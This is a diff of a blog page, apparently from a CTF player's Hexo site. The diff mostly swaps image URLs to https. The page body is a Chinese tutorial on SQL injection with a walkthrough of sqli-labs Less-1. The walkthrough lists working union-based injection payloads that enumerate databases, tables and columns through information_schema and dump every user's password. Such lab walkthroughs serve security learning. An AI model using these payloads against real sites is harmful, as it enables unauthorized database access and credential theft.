@@ -4,7 +4,7 @@
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- Title -->
     
-    <title>about - DV.K</title>
+    <title>Category - DV.K</title>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
     <meta name="keywords" content="DV.K CTFer" />
@@ -59,7 +59,7 @@
 
                 <!-- Content -->
                 <section id="content">
-                    <div class ="post_page_title_img" style="background-image: url(http://cdn.dvkunion.cn/blog/20190506/vhicMCTjS2F2.jpg);" ></div>
+                    <div class ="post_page_title_img" style="background-image: url(https://cdn.dvkunion.cn/blog/20190506/vhicMCTjS2F2.jpg);" ></div>
                     <hr>
                     <h1>Web-SQL</h1>
 <hr>
@@ -75,7 +75,7 @@
 <p>SQL注入，就是在脚本语言构造查询语句的时候，通过传入一些特殊的字符或是特定的数据库函数参数，从而实现对数据库的任意操作，达到攻击目的。</p>
 <p>SQL语句具有灵活、通用的优点，所以通常动态SQL语句都是在执行的过程中创建的。在这个过程中如果没有对一些敏感函数和特殊符号进行过滤，构造出的SQL语则会可能带有强力的攻击性。</p>
 <p>手画一幅图来更好的表达我的意思：</p>
-<p><img src="http://cdn.dvkunion.cn/blog/20190506/oCD96K2MLzRo.png" class="lazyload" data-srcset="http://cdn.dvkunion.cn/blog/20190506/oCD96K2MLzRo.png" srcset="/css/images/overlay.png" alt="mark"></p>
+<p><img src="https://cdn.dvkunion.cn/blog/20190506/oCD96K2MLzRo.png" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190506/oCD96K2MLzRo.png" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>灵魂画手。但是应该可以简单的表达出一次Sql注入攻击。</p>
 <p>练习SQL注入时，可以通过LAMP环境搭建一个练习靶场，如sqli-labs、dvwa等等。</p>
 <p>放一个 Ms17010实验室的在线SQLi-labs环境，在这里感谢大佬贡献的练习靶机:</p>
@@ -102,34 +102,34 @@
 <h4><font color="blue">sqli-labs</font><br></h4>
 <p><b>Less-1:GET-Error Based-String quotes - String</b></p>
 <p>第一题开头应该是最简单的，首先带入'单引号进行fuzz测试</p>
-<p><img src="http://cdn.dvkunion.cn/blog/20190514/mWNCxs98K1AU.png?imageslim" class="lazyload" data-srcset="http://cdn.dvkunion.cn/blog/20190514/mWNCxs98K1AU.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
+<p><img src="https://cdn.dvkunion.cn/blog/20190514/mWNCxs98K1AU.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/mWNCxs98K1AU.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>发现报错，并切后面出现了 limit 字样，说明后面存在多余的语句，我们需要注释掉后面的语句才能运行。<br>
 传参 id=1' order by 1%23 判断列数，在4时报错</p>
-<p><img src="http://cdn.dvkunion.cn/blog/20190514/NB1YtWkMUYxo.png?imageslim" class="lazyload" data-srcset="http://cdn.dvkunion.cn/blog/20190514/NB1YtWkMUYxo.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
+<p><img src="https://cdn.dvkunion.cn/blog/20190514/NB1YtWkMUYxo.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/NB1YtWkMUYxo.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>说明一共存在三列，我们开始构造union查询：<br>
 id=-1' union select 1,2,3%23</p>
-<p><img src="http://cdn.dvkunion.cn/blog/20190514/kImfWSWEjnlr.png?imageslim" class="lazyload" data-srcset="http://cdn.dvkunion.cn/blog/20190514/kImfWSWEjnlr.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
+<p><img src="https://cdn.dvkunion.cn/blog/20190514/kImfWSWEjnlr.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/kImfWSWEjnlr.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>得到了数据对应的列的位置，我们在这几个位置使用union对数据进行其他数据库查询即可：</p>
 <p>id=-1%27%20%20union%20select%201,user(),3%23 查询数据库用户名</p>
-<p><img src="http://cdn.dvkunion.cn/blog/20190514/H85ENgRVg8Pf.png?imageslim" class="lazyload" data-srcset="http://cdn.dvkunion.cn/blog/20190514/H85ENgRVg8Pf.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
+<p><img src="https://cdn.dvkunion.cn/blog/20190514/H85ENgRVg8Pf.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/H85ENgRVg8Pf.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>id=-1%27%20%20union%20select%201,database(),3%23 查询当前数据库名</p>
-<p><img src="http://cdn.dvkunion.cn/blog/20190514/u677htpChFE9.png?imageslim" class="lazyload" data-srcset="http://cdn.dvkunion.cn/blog/20190514/u677htpChFE9.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
+<p><img src="https://cdn.dvkunion.cn/blog/20190514/u677htpChFE9.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/u677htpChFE9.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>我们也可以直接爆所有存在的数据库：</p>
 <p>id=-1%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata%20%23</p>
-<p><img src="http://cdn.dvkunion.cn/blog/20190514/bign3RmOAjcc.png?imageslim" class="lazyload" data-srcset="http://cdn.dvkunion.cn/blog/20190514/bign3RmOAjcc.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
+<p><img src="https://cdn.dvkunion.cn/blog/20190514/bign3RmOAjcc.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/bign3RmOAjcc.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>然后我们可以利用 mysql中的一个特殊数据库进行爆表：</p>
 <p>id=-1' union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=database()%23</p>
 <p>group_concat可以将内容按照要求的以默认的逗号打印出来，占一列的值。</p>
-<p><img src="http://cdn.dvkunion.cn/blog/20190514/KVmUo4gN7P9t.png?imageslim" class="lazyload" data-srcset="http://cdn.dvkunion.cn/blog/20190514/KVmUo4gN7P9t.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
+<p><img src="https://cdn.dvkunion.cn/blog/20190514/KVmUo4gN7P9t.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/KVmUo4gN7P9t.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>爆出了表名，我们可以继续查询表内字段名：</p>
 <p>id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='emails'%23</p>
-<p><img src="http://cdn.dvkunion.cn/blog/20190514/nyVNYaN18SFr.png?imageslim" class="lazyload" data-srcset="http://cdn.dvkunion.cn/blog/20190514/nyVNYaN18SFr.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
+<p><img src="https://cdn.dvkunion.cn/blog/20190514/nyVNYaN18SFr.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/nyVNYaN18SFr.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>同样也可以对users表进行查询：</p>
 <p>id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'%23</p>
-<p><img src="http://cdn.dvkunion.cn/blog/20190514/TLBktVJWYTJd.png?imageslim" class="lazyload" data-srcset="http://cdn.dvkunion.cn/blog/20190514/TLBktVJWYTJd.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
+<p><img src="https://cdn.dvkunion.cn/blog/20190514/TLBktVJWYTJd.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/TLBktVJWYTJd.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>发现存在关键字段password,我们去爆出所有的password</p>
 <p>id=-1' union select 1,2,group_concat(password) from security.users %23</p>
-<p><img src="http://cdn.dvkunion.cn/blog/20190514/i6l6StGSBHHz.png?imageslim" class="lazyload" data-srcset="http://cdn.dvkunion.cn/blog/20190514/i6l6StGSBHHz.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
+<p><img src="https://cdn.dvkunion.cn/blog/20190514/i6l6StGSBHHz.png?imageslim" class="lazyload" data-srcset="https://cdn.dvkunion.cn/blog/20190514/i6l6StGSBHHz.png?imageslim" srcset="/css/images/overlay.png" alt="mark"></p>
 <p>得到所有人的密码。</p>
 <p>这样是通过了Union进行的注入，同样这题也可以通过报错注入得到结果。</p>
 
